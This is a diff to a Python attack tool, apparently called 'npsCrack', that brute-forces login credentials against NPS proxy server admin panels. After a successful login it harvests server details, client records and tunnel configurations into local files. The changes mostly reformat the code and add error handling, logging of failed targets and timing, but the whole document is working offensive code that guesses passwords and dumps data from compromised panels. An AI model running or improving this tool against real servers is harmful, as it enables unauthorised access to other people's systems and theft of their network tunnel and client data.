@@ -2,7 +2,7 @@
 Author         : Sp4ce
 Date           : 2020-11-23 11:31:02
 LastEditors    : Sp4ce
-LastEditTime   : 2020-11-24 19:52:05
+LastEditTime   : 2020-11-26 11:05:51
 Description    : Challenge Everything.
 '''
 import argparse
@@ -122,16 +122,16 @@ class npsCrack:
                     format(USERNAME=username, PASSWORD=passwords, TARGET=url))
                 try:
                     res = requests.post(self.loginUrl.format(URL=url),
-                                    data=data.format(USERNAME=username,
-                                                     PASSWORD=passwords),
-                                    headers=self.headers,
-                                    timeout=self.timeout,
-                                    verify=False)
+                                        data=data.format(USERNAME=username,
+                                                         PASSWORD=passwords),
+                                        headers=self.headers,
+                                        timeout=self.timeout,
+                                        verify=False)
                     resStatus = json.loads(res.text)
                     if resStatus['status'] == 1:
                         with open('success.txt', 'a+') as f:
-                            f.write(url + '-----' + username + '----' + passwords +
-                                    '\n')
+                            f.write(url + '-----' + username + '----' +
+                                    passwords + '\n')
                         self.loginSession = res.headers['Set-Cookie']
                         self.target = url
                         logger.info("{URL} Login Success.".format(URL=url))
@@ -161,11 +161,14 @@ class npsCrack:
                         return True
                     else:
                         logger.warning(
-                            "{URL} Login Failed with {USERNAME}/{PASSWORD}".format(
-                                URL=url, USERNAME=username, PASSWORD=passwords))
+                            "{URL} Login Failed with {USERNAME}/{PASSWORD}".
+                            format(URL=url,
+                                   USERNAME=username,
+                                   PASSWORD=passwords))
                         pass
                 except:
                     logger.error("{URL} Connect Failed.".format(URL=url))
+                    self.markFailedIp(url)
                     pass
 
     '''
@@ -190,52 +193,61 @@ class npsCrack:
         data['offset'] = "0"
         data['limit'] = "10"
         self.headers['Cookie'] = self.loginSession
-        res = requests.post(self.clientUrl.format(URL=url),
-                            data=data,
-                            headers=self.headers,
-                            timeout=self.timeout,
-                            verify=False)
-        resJson = json.loads(res.text)
-        #logger.info(resJson)
-        totalClients = resJson['total']
-        #write server data
-        if 'ip' in resJson:
-            serverIP = resJson['ip']
-            serverBridgePort = resJson['bridgePort']
-            serverBridgeType = resJson['bridgeType']
-            logger.warning(
-                "NPS server IP:{IP} bridgeport:{BRIDGEPORT} bridgetype:{BRIDGETYPE}."
-                .format(IP=serverIP,
-                        BRIDGEPORT=serverBridgePort,
-                        BRIDGETYPE=serverBridgeType))
-            saveFilename = self.savePath + '/ServerInfo-' + self.nowDate + '.txt'
-            writeData = "ServerIP : " + serverIP + '\n'
-            writeData += "ServerBridgePort : " + str(serverBridgePort) + '\n'
-            writeData += "ServerBridgeType : " + serverBridgeType + '\n'
+        try:
+            res = requests.post(self.clientUrl.format(URL=url),
+                                data=data,
+                                headers=self.headers,
+                                timeout=self.timeout,
+                                verify=False)
+            resJson = json.loads(res.text)
+            #logger.info(resJson)
+            totalClients = resJson['total']
+            #write server data
+            if 'ip' in resJson:
+                serverIP = resJson['ip']
+                serverBridgePort = resJson['bridgePort']
+                serverBridgeType = resJson['bridgeType']
+                logger.warning(
+                    "NPS server IP:{IP} bridgeport:{BRIDGEPORT} bridgetype:{BRIDGETYPE}."
+                    .format(IP=serverIP,
+                            BRIDGEPORT=serverBridgePort,
+                            BRIDGETYPE=serverBridgeType))
+                saveFilename = self.savePath + '/ServerInfo-' + self.nowDate + '.txt'
+                writeData = "ServerIP : " + serverIP + '\n'
+                writeData += "ServerBridgePort : " + str(
+                    serverBridgePort) + '\n'
+                writeData += "ServerBridgeType : " + serverBridgeType + '\n'
+                writeData += "Login URL : " + url + '\n'
+                with open(saveFilename, "a+") as f:
+                    f.write(writeData)
+            else:
+                logger.warning("NPS server IP:{IP}".format(IP=self.hostname))
+                saveFilename = self.savePath + '/ServerInfo-' + self.nowDate + '.txt'
+                with open(saveFilename, "a+") as f:
+                    f.write(
+                        json.dumps(resJson['rows'], indent=2) + "\nLogin URL" +
+                        url)
+            #get all client info
+            data['limit'] = totalClients
+            logger.info(
+                "Get {TOTALNUMS} clients.".format(TOTALNUMS=totalClients))
+            res = requests.post(self.clientUrl.format(URL=url),
+                                data=data,
+                                headers=self.headers,
+                                timeout=self.timeout,
+                                verify=False)
+            resJson = json.loads(res.text)
+            allRows = resJson['rows']
+            saveFilename = self.savePath + '/ClientsInfo-' + self.nowDate + '.json'
             with open(saveFilename, "a+") as f:
-                f.write(writeData)
-            
-        else:
-            logger.warning("NPS server IP:{IP}".format(IP=self.hostname))
-            saveFilename = self.savePath + '/ServerInfo-' + self.nowDate + '.txt'
-            with open(saveFilename, "a+") as f:
-                f.write(json.dumps(resJson['rows'],indent=2))
-        #get all client info
-        data['limit'] = totalClients
-        logger.info("Get {TOTALNUMS} clients.".format(TOTALNUMS=totalClients))
-        res = requests.post(self.clientUrl.format(URL=url),
-                            data=data,
-                            headers=self.headers,
-                            timeout=self.timeout,
-                            verify=False)
-        resJson = json.loads(res.text)
-        allRows = resJson['rows']
-        saveFilename = self.savePath + '/ClientsInfo-' + self.nowDate + '.json'
-        with open(saveFilename, "a+") as f:
-            f.write(json.dumps(allRows, indent=2))
-        for row in allRows:
-            self.clientsId.append(row['Id'])
-        self.getNpsTunnelInfo(self.target)
+                f.write(json.dumps(allRows, indent=2))
+            for row in allRows:
+                self.clientsId.append(row['Id'])
+            self.getNpsTunnelInfo(self.target)
+        except:
+            logger.error('Clients connect failed.')
+            self.markFailedIp(url)
+            pass
 
     '''
     Request:
@@ -267,11 +279,12 @@ class npsCrack:
             data['client_id'] = i
             try:
                 res = requests.post(url=self.tunnelUrl.format(URL=url),
-                                data=data,
-                                headers=self.headers,
-                                timeout=self.timeout,
-                                verify=False)
-                logger.info('Get client {CLIENTID} tunnels success.'.format(CLIENTID=i))
+                                    data=data,
+                                    headers=self.headers,
+                                    timeout=self.timeout,
+                                    verify=False)
+                logger.info('Get client {CLIENTID} tunnels success.'.format(
+                    CLIENTID=i))
                 saveFilename = self.savePath + '/tunnels/Client-[' + str(
                     i) + ']-Tunnels-Info.json'
                 resJson = json.loads(res.text)
@@ -281,8 +294,14 @@ class npsCrack:
                         f.write(json.dumps(allRows, indent=2))
             except:
                 logger.error('Tunnels connect failed.')
-        self.clientsId=[]
+                self.markFailedIp(self.tunnelUrl.format(URL=url))
+                pass
+        self.clientsId = []
 
+    def markFailedIp(self, ip):
+        logger.warning("Detect connect error with {URL}".format(URL=ip))
+        with open("failed.txt", "a+") as f:
+            f.write(ip + '\n')
 
     def run(self):
         if os.path.isfile(self.targetFile):
@@ -309,9 +328,13 @@ class npsCrack:
         logger.info(
             "Load {0} Username(s) and {1} Password(s) For Test {2} Target(s).".
             format(len(self.username), len(self.password), len(self.urls)))
+        startTime = time.process_time()
         for url in self.urls:
             if self.checkLogin(url, self.username, self.password):
                 self.getNpsInfo(self.target)
+        endTime = time.process_time()
+        logger.info("All things done in {TIME} s".format(TIME=endTime -
+                                                         startTime))
 
 
 if __name__ == "__main__":
